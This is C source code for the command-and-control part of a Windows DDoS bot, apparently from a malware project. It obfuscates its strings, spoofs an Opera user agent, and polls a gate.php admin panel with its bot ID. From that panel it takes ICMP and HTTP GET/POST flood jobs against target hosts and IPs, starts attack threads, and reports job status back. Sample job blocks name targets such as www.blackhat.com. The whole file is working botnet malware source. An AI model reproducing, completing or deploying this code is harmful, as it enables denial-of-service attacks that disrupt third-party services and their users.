#define _JOB_ICMP_TARGET_IP			DeCrypt("\x94\xa1\xa4\x99\x94\xa2\x98\xa6\xa3\x94\x87\x9a\x89\x9c\x9e\x87\x94\xa2\xa3")
#define _JOB_ID 					DeCrypt("\x94\xa1\xa4\x99\x94\xa2\x97")
#define _JOB_ICMP_SEGMENT_SIZE 		DeCrypt("\x94\xa1\xa4\x99\x94\xa2\x98\xa6\xa3\x94\x88\x9e\x9c\xa6\x9e\xa5\x87\x94\x88\xa2\x91\x9e")
#define _JOB_HTTP_ACTION			DeCrypt("\x94\xa1\xa4\x99\x94\x9b\x87\x87\xa3\x94\x9a\x98\x87\xa2\xa4\xa5")
#define _JOB_HTTP_TARGET_HOST 		DeCrypt("\x94\xa1\xa4\x99\x94\x9b\x87\x87\xa3\x94\x87\x9a\x89\x9c\x9e\x87\x94\x9b\xa4\x88\x87")
#define _JOB_HTTP_TARGET_IP 		DeCrypt("\x94\xa1\xa4\x99\x94\x9b\x87\x87\xa3\x94\x87\x9a\x89\x9c\x9e\x87\x94\xa2\xa3")
#define _JOB_HTTP_PORT 				DeCrypt("\x94\xa1\xa4\x99\x94\x9b\x87\x87\xa3\x94\xa3\xa4\x89\x87")
#define _NEW_JOB_					DeCrypt("\x94\xa5\x9e\x8c\x94\xa1\xa4\x99\x94")
#define _JOB_TYPE_					DeCrypt("\x94\xa1\xa4\x99\x94\x87\x92\xa3\x9e\x94")
#define _JOB_STOP_					DeCrypt("\x94\xa1\xa4\x99\x94\x88\x87\xa4\xa3\x94")
#define _JOB_RESUME_ 				DeCrypt("\x94\xa1\xa4\x99\x94\x89\x9e\x88\x8e\xa6\x9e\x94")
#define HTTP_200_OK					DeCrypt("\x9b\x87\x87\xa3\x44\xaa\x45\xaa\x53\xa9\x43\x43\x53\xa4\xa0")
#define D_GET						DeCrypt("\x9c\x9e\x87\x53")
#define D_POST						DeCrypt("\xa3\xa4\x88\x87\x53")
#define D_HTTP_11					DeCrypt("\x53\x9b\x87\x87\xa3\x44\xaa\x45\xaa")
#define D_HOST						DeCrypt("\x9b\x84\xe8\xe7\xb1\x53")
#define D_CMD_INFO_BOT_ID			DeCrypt("\xb4\x78\x86\x77\xb6\x82\x85\x7d\x84\x3d\x79\x84\xe7\x94\x82\x77\xb6")
#define D_JOB_STATUS				DeCrypt("\x3d\x81\x84\x79\x94\xe8\xe7\x7a\xe7\xee\xe8\xb6")
#define D_BOT_ID					DeCrypt("\x3d\x79\x84\xe7\x94\x82\x77\xb6")
#define D_CMD_JOB_STATUS			DeCrypt("\xb4\x78\x86\x77\xb6\x81\x84\x79\x94\xe8\xe7\x7a\xe7\xee\xe8\x3d\x81\x84\x79\x94\x82\x77\xb6")/* ?cmd=job_status&job_id= */
#define D_USERAGENT					DeCrypt("\x8e\xe8\x7e\xe9\x9a\x7c\x7e\x85\xe7\xb1\x53")/* UserAgent:  */
#define D_OPERA_926					DeCrypt("\xa4\x83\x7e\xe9\x7a\x44\xb2\x45\xa9\xad\x53\x3b\x8c\x82\x85\x77\x84\xec\xe8\x53\xa5\x87\x53\xae\x45\xaa\xb0\x53\x8e\xb0\x53\x7e\x85\x42")/* Opera/9.26 (Windows NT 5.1; U; en) */
//=======================================================================================
PCHAR GetOptions(PCHAR OptionName,PCHAR Buffer,ULONG BufferSize)
{
	PCHAR pTemp = 0,tempBuffer = Buffer;
	ULONG nSize = 0;

	do {
		pTemp = strstr(tempBuffer,OptionName);
		if(pTemp)
			goto end;
		if(nSize >= BufferSize)
			goto end;
		tempBuffer += 1;
		nSize += 1;
	}	while(!pTemp);
end:
	if(pTemp)
		pTemp += strlen(OptionName) + 1;
	return pTemp;
}
//=======================================================================================
PCHAR RandomUserAgent()
{
	return D_OPERA_926;
}
//=======================================================================================
BOOLEAN DeleteJob(PBotTask Task)
{
	PBotTask pPrevTask = Task->pPrevTask;

	
	__try {
		pPrevTask->pNextTask = 0;
		FREE(Task->Job);
		FREE(Task);
		return TRUE;
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"Error on free memory!\n");
#endif
		return FALSE;
	}
}
//=======================================================================================
BOOLEAN StartNewJob(PBotTask Task)
{
	BOOLEAN bRet = FALSE;
	
	switch(Task->JobType)
	{
		case JOB_TYPE_ICMP:
			{
				Task->JobThreadHandle = api.pCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&StartIcmpJob, Task, 0, &Task->JobThreadId);
				if(!Task->JobThreadHandle)
				{
					Task->JobStatus = JOB_STATUS_EXIT;
					bRet = FALSE;
				}	else	{
					Task->JobStatus = JOB_STATUS_WORK;
					bRet = TRUE;
				}
				break;
			}
		case JOB_TYPE_HTTP_GET:
			{
				Task->JobThreadHandle = api.pCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&StartHttpJob,Task,0,&Task->JobThreadId);
				if(!Task->JobThreadHandle)
				{
					Task->JobStatus = JOB_STATUS_EXIT;
					bRet = FALSE;
				}	else	{
					Task->JobStatus = JOB_STATUS_WORK;
					bRet = TRUE;
				}
				break;
			}
		default:
			{
				bRet = FALSE;
#ifdef _DEBUG_
				DbgMsgEx(__FILE__,__LINE__,"Error task type\n");
#endif
				break;
			}
	}
	goto end;

end:
	return bRet;
}
//=======================================================================================
BOOLEAN CheckBotJob(ULONG JobUid)
{
	/*+ ‘ункци€ провер€ет не выполн€ет ли бот уже данную работу	+*/
	PBotTask	pTask = &g_BotTask;
	PBotIcmpJob pIcmpTask = 0;
	PBotJobHttp pHttpTask = 0;
	BOOLEAN bRet = FALSE;

	__try {
		do {
			if(pTask->pPrevTask != 0)
			{
				if(pTask->JobId == JobUid)
				{
					bRet = TRUE;
					break;
				}	else	{
					goto NextJob;
				}
			}	else	{
NextJob:
				pTask = pTask->pNextTask;
			}
		}	while(pTask);
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"Error exception on CheckBotJob\n"); 
#endif
	}

	goto end;
end:
	return bRet;
}
//=======================================================================================
PCHAR AddNewJob(PCHAR pBuffer,ULONG nSize)
{
	/*+ ‘ункци€ добавл€ет новое задание +*/

	// строковые значени€
	PCHAR JobType = 0;
	PCHAR Return = 0;
	PCHAR SegmentSize = 0;
	PCHAR TargetIp = 0;
	PCHAR TargetPort = 0;
	PCHAR JobId = 0;
	PCHAR TargetHost = 0;
	PCHAR TargetAction = 0;
	
	ULONG nDstIpAddr = 0;
	ULONG nSegmentSize = 0;
	ULONG Len = 0;

	PBotTask	pTask = &g_BotTask,pNewTask = 0;
	PBotIcmpJob pIcmpTask = 0;
	PBotJobHttp pHttpgTask = 0;

	CHAR Job[4] = { 0 };
	CHAR Port[8] = { 0 };
 
	JobType = strstr(pBuffer,_JOB_TYPE_);
	if(JobType)
	{
		memcpy(&Job,JobType + 11,2);
		if(strcmp((char *)&Job,"ic") == 0)
		{
			//===================================================================================
			/*
				_JOB_TYPE_:ic
				_JOB_ICMP_SEGMENT_SIZE:3133
				_JOB_ICMP_TARGET_IP:192.168.1.1
			*/

			TargetIp	= GetOptions(_JOB_ICMP_TARGET_IP,pBuffer,nSize);
			JobId		= GetOptions(_JOB_ID,pBuffer,nSize);
			SegmentSize = GetOptions(_JOB_ICMP_SEGMENT_SIZE,pBuffer,nSize);

			nDstIpAddr	= api.pinet_addr(TargetIp);
			nSegmentSize= atoi(SegmentSize);

			do {
				if(pTask->pNextTask == 0)
				{
					if(CheckBotJob(atoi(JobId)))
					{
#ifdef _DEBUG_
						DbgMsgEx(__FILE__,__LINE__,"Already do this job ! %s\n",JobId);
#endif
					}
					pIcmpTask = ALLOC(sizeof(struct _BOT_JOB_ICMP));
					pNewTask  = ALLOC(sizeof(struct _BOT_TASK));

					if(!pIcmpTask || !pNewTask)
					{
						goto ErrorIcmp;
					}
					pIcmpTask->HostIp = nDstIpAddr;
					pIcmpTask->PacketSize	= nSegmentSize;

					pNewTask->Job = pIcmpTask;
					pNewTask->JobId = atoi(JobId);
					pNewTask->pNextTask = 0;
					pNewTask->bStop = FALSE;
					pNewTask->pPrevTask = pTask;
					pNewTask->JobType	= JOB_TYPE_ICMP;

					if(StartNewJob(pNewTask) || pNewTask->JobStatus != JOB_STATUS_WORK)
					{
						pTask->pNextTask = pNewTask;
						break;
					}	else	{
						goto ErrorIcmp;
					}
				}	else	{
					pTask = pTask->pNextTask;
				}
			}	while(1);

		}	else if (strcmp((char *)&Job,"hg") == 0){
HttpJobGet:
			/*
			_NEW_JOB_ 
			_JOB_TYPE_:hg 
			_JOB_HTTP_ACTION:?info=aaa&b=cccc 
			_JOB_HTTP_TARGET_HOST:www.blackhat.com 
			_JOB_HTTP_TARGET_IP:212.88.55.2 
			_JOB_ID_:31338 
			_JOB_HTTP_PORT:80
			*/
			TargetAction= GetOptions(_JOB_HTTP_ACTION,pBuffer,nSize);
			TargetHost  = GetOptions(_JOB_HTTP_TARGET_HOST,pBuffer,nSize);
			TargetIp	= GetOptions(_JOB_HTTP_TARGET_IP,pBuffer,nSize);
			TargetPort  = GetOptions(_JOB_HTTP_PORT,pBuffer,nSize);
			JobId		= GetOptions(_JOB_ID,pBuffer,nSize);
			
			if(	!TargetAction	||
				!TargetHost		||
				!TargetIp		||
				!TargetPort		||
				!JobId)
				goto ErrorHttp;
			//DbgPrintEx("Job type : HTTP GET\n TargetIP[%s]\n TargetHost[%s]\n TargetPort[%s]\n TargetAction[%s]\n",
			//				TargetIp,TargetHost,TargetPort,TargetAction);			
			
			do {
				if(pTask->pNextTask == 0)
				{
					// parse parametrs
					pHttpgTask = ALLOC(sizeof(struct _BOT_JOB_HTTP));
					pNewTask  = ALLOC(sizeof(struct _BOT_TASK));

					if(!pHttpgTask || !pNewTask)
					{
						goto ErrorHttp;
					}
					
					pHttpgTask->HostIp = api.pinet_addr(TargetIp);
					rtl_strcpy((PCHAR)&pHttpgTask->ActionParam,TargetAction);
					if (strcmp((char *)&Job,"hp") == 0)
					{
						rtl_strcpy((PCHAR)&pHttpgTask->Action,D_GET);
					}	else	{
						rtl_strcpy((PCHAR)&pHttpgTask->Action,D_POST);	
					}					
					rtl_strcpy((PCHAR)&pHttpgTask->Host,TargetHost);
					pHttpgTask->Port = (USHORT)atoi(TargetPort);
							
					pNewTask->Job = pHttpgTask;
					pNewTask->JobId = atoi(JobId);
					pNewTask->pNextTask = 0;
					pNewTask->bStop = FALSE;
					pNewTask->pPrevTask = pTask;
					pNewTask->JobType	= JOB_TYPE_HTTP_GET;

					if(StartNewJob(pNewTask) || pNewTask->JobStatus != JOB_STATUS_WORK)
					{
						pTask->pNextTask = pNewTask;
						break;
					}	else	{
						goto ErrorHttp;
					}
				}	else	{
					pTask = pTask->pNextTask;
				}
			}	while(1);

		}	else if (strcmp((char *)&Job,"hp") == 0){
			/*			
			 _NEW_JOB_ 
			 _JOB_TYPE_:hp 
			 _JOB_HTTP_ACTION:?search=egqoige&tp=33813&bg=31331 
			 _JOB_HTTP_TARGET_HOST:www.wasm.ru 
			 _JOB_HTTP_TARGET_IP:122.44.12.72 
			 _JOB_HTTP_PORT:80
			 _JOB_ID_:31339 						
			*/
#ifdef _DEBUG_
			DbgPrintEx("Job type : HTTP POST\n");
#endif
			goto HttpJobGet;
		}
	}
	goto end;
ErrorIcmp:
	// free resources
	__try {
		FREE(pIcmpTask);
		FREE(pNewTask);
	}	__except(EXCEPTION_EXECUTE_HANDLER){
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"Error exception on free memory ! fix it vrot mne noge\n");
#endif
	}
	goto end;
ErrorHttp:
	goto end;
end:
	Len = strlen(_NEW_JOB_) + 1;
	Return = GetOptions(_NEW_JOB_,pBuffer + 5,nSize);
	if(Return)
		Return -= Len ;
	return Return;
}
//=======================================================================================
BOOLEAN KnockStatInfo(PBotTask pParam)
{
	/*
		[+] ƒелает отстук в админку, отправл€€ информацию об состо€нии работ.
	 */
	PBotTask pTask = pParam;
	BOOLEAN bRet = FALSE;
	PCHAR pRequest = 0,pTemp = 0,pCmd = 0,pJobStatus = 0, pPtr = 0;
	SOCKET hServer;
	ULONG Len = 0,TempLen = 0,BufferLen = 0;
	struct	sockaddr_in sin_addr = { 0 };	
	
	pRequest = ALLOC(256);
	pTemp	= ALLOC(256);
	if(!pRequest || !pTemp)
		goto end;

	rtl_memset(pRequest,0,256);
	rtl_memset(pTemp,0,256);

	rtl_strcpy(pRequest,D_GET);
	rtl_strcat(pRequest,CONFIG_PATH_TO_SCRIPT);
	rtl_strcat(pRequest,D_CMD_INFO_BOT_ID);
	rtl_strcat(pRequest,pGlobOpt->szBotId);
	rtl_strcat(pRequest,D_HTTP_11);

	pRequest[strlen(pRequest)] = '\r';
	pRequest[strlen(pRequest)] = '\n';

	rtl_strcat(pRequest,"User-Agent: ");
	rtl_strcat(pRequest,RandomUserAgent());
	rtl_strcat(pRequest,"\r\n");
	rtl_strcat(pRequest,D_HOST);
	rtl_strcat(pRequest,CONFIG_WEB_HOST_NAME);
	rtl_strcat(pRequest,"\r\n\r\n");

#ifdef _DEBUG_
	DbgPrintEx("Request data : %s\n",pRequest);
#endif

	hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(hServer == INVALID_SOCKET)
	{
		goto end;
	}
	
	sin_addr.sin_addr.S_un.S_addr = pGlobOpt->dwGateIp;
	sin_addr.sin_port = api.phtons(pGlobOpt->Port);
	sin_addr.sin_family = AF_INET;

	if(socks_CONNECT(hServer,(SOCKADDR *)&sin_addr, sizeof(sin_addr)) == SOCKET_ERROR)
	{
		goto end;
	}

	Len = strlen(pRequest);
	TempLen = socks_SEND(hServer,pRequest,Len,0);
	if(	TempLen != Len || TempLen <= 0) 
	{
		goto end;
	}

	FREE(pRequest);
	pPtr = ALLOC(2048);
	if(!pPtr)
		goto end;

	pRequest = pPtr;
	do
	{
		memset(pTemp,0,256);		

		Len = socks_RECV(hServer,pTemp,256,"");//STR_SOCKS_DATA);
		if(Len <= 0 || Len == -1)
			break;

		BufferLen += Len;
		memcpy(pPtr,pTemp,Len);
		pPtr += Len;
	}	while(Len != -1 || Len > 0);

	do {
		pPtr = strstr(pRequest,_NEW_JOB_);
		if(pPtr)
		{
			pRequest = AddNewJob(pPtr,BufferLen);
		}	
		if(!pRequest)
			break;
	}	while(pPtr = strstr(pRequest,_NEW_JOB_));

end:
 	__try {
		if(hServer)
		{
			api.pshutdown(hServer,0);
			api.pclosesocket(hServer);
		}
		if(pRequest)
		{
			FREE(pRequest);
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"On free memory exception! Fix it\n");
#endif
	}
	return bRet;
}
//=======================================================================================
BOOLEAN KnockStatJob(PBotTask pParam)
{
	/*
		[+] ƒелает отстук в админку, отправл€€ информацию об состо€нии работ.
	 */
	PBotTask pTask = pParam;
	BOOLEAN bRet = FALSE;
	PCHAR pRequest = 0,pTemp = 0,pCmd = 0,pJobStatus = 0, pPtr = 0;
	SOCKET hServer;
	ULONG Len,TempLen;
	struct	sockaddr_in sin_addr = { 0 };	
	
/*
	GET /socks5/gate.php?job_status&job_id=222&task_stat=work&bot_id=2,stop,pause HTTP/1.1
	User-Agent: Opera/9.26 (Windows NT 5.1; U; en)
	Host: 192.168.168.217
*/

	do {
		// check task
		if(pTask)
		{
			if(	pTask->pPrevTask == NULL)
			{
				goto Next;
			}

			// выдел€ем пам€ть под запросы
			pRequest = ALLOC(256);
			pTemp	= ALLOC(256);

			if(!pRequest || !pTemp)
				goto end;

			// GET path.php?cmd=job_status&job_id=3122
			//  /ddos/gate.php?cmd=job_status&job_id=31696167&job_status=work&bot_id6339181491 HTTP/1.1" 200 392
			rtl_strcpy(pRequest,D_GET);
			rtl_strcat(pRequest,CONFIG_PATH_TO_SCRIPT);

			rtl_strcat(pRequest,D_CMD_JOB_STATUS);

			itoa(pTask->JobId,pTemp,10);
			rtl_strcat(pRequest,pTemp);

			rtl_strcat(pRequest,D_JOB_STATUS);

			if(pTask->JobStatus		 == JOB_STATUS_WORK)
				pJobStatus = "work";
			else if(pTask->JobStatus == JOB_STATUS_EXIT)
				pJobStatus = "exit";
			else if(pTask->JobStatus == JOB_STATUS_PAUSE)
				pJobStatus = "pause";

			rtl_strcat(pRequest,pJobStatus);
			rtl_strcat(pRequest,D_BOT_ID);
			rtl_strcat(pRequest,pGlobOpt->szBotId);
			rtl_strcat(pRequest,D_HTTP_11);
			pRequest[strlen(pRequest)] = '\r';
			pRequest[strlen(pRequest)] = '\n';
			rtl_strcat(pRequest,"User-Agent: ");
			rtl_strcat(pRequest,RandomUserAgent());
			rtl_strcat(pRequest,"\r\n");
			rtl_strcat(pRequest,D_HOST);
			rtl_strcat(pRequest,CONFIG_WEB_HOST_NAME);
			rtl_strcat(pRequest,"\r\n\r\n");

			hServer = api.psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(hServer == INVALID_SOCKET)
			{
				goto Next;
			}
			

			sin_addr.sin_addr.S_un.S_addr = pGlobOpt->dwGateIp;
			sin_addr.sin_port = api.phtons(pGlobOpt->Port);
			sin_addr.sin_family = AF_INET;

			if(socks_CONNECT(hServer,(SOCKADDR *)&sin_addr, sizeof(sin_addr)) == SOCKET_ERROR)
			{
				goto Next;
			}
		
			Len = strlen(pRequest);
			TempLen = socks_SEND(hServer,pRequest,Len,0);
			if(	TempLen != Len || TempLen <= 0) 
			{
				goto Next;
			}

			FREE(pRequest);
			pPtr = ALLOC(2048);
			if(!pPtr)
				goto Next;

			pRequest = pPtr;
			do
			{
				rtl_memset(pTemp,0,256);		

				Len = socks_RECV(hServer,pTemp,256,"");//STR_SOCKS_DATA);
				if(Len <= 0 || Len == -1)
					break;

				memcpy(pPtr,pTemp,Len);
				pPtr += Len;
			}	while(Len != -1 || Len > 0);

			if(strcmp(pRequest,HTTP_200_OK)==0)	//"HTTP/1.1 200 OK") == 0)
			{
				// send request for another job
				goto Next;
			}

			// IF STOP TASK
			pCmd = strstr(pRequest,_JOB_STOP_);
			if(pCmd)
			{
				pTask->JobStatus = JOB_STATUS_EXIT;
				pTask->bStop	 = TRUE;
				goto Next;
			}

			// if resume task
			pCmd = strstr(pRequest,_JOB_RESUME_);
			if(pCmd)
			{
				pTask->JobStatus = JOB_STATUS_WORK;
				goto Next;
			}
		}
Next:
		// goto next task
		__try {
		if(pRequest)
			FREE(pRequest);
		}	__except(EXCEPTION_EXECUTE_HANDLER)
		{
#ifdef _DEBUG_
			DbgMsgEx(__FILE__,__LINE__,"On free memory exception! Fix it\n");
#endif
		}
		pTask = pTask->pNextTask;
	}	while(pTask);

end:
	__try { 
		if(hServer)
		{
			api.pshutdown(hServer,0);
			api.pclosesocket(hServer);
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
#ifdef _DEBUG_
		DbgMsgEx(__FILE__,__LINE__,"On free memory exception! Fix it\n");
#endif
	}
	return bRet;

}
//=============================================================================
BOOLEAN KnockStat(PVOID pParam)
{
	BOOLEAN bRet = FALSE;
	/*
		1) отстучатс€ по всем задани€м в админку и рассказать о статусе выполнени€
		2) отстучать дл€ получени€ новых заданий
	*/

	KnockStatJob(&g_BotTask);
	KnockStatInfo(&g_BotTask);

	return bRet;
}
//=============================================================================
DWORD WINAPI DDoS(LPVOID pParam)
{
	PBotTask pLocalTask = 0;

	while(g_bDie == FALSE)
	{
		KnockStat(0);
		api.pSleep(pGlobOpt->dwSleepTime);
	}
	return 1;
}
//=============================================================================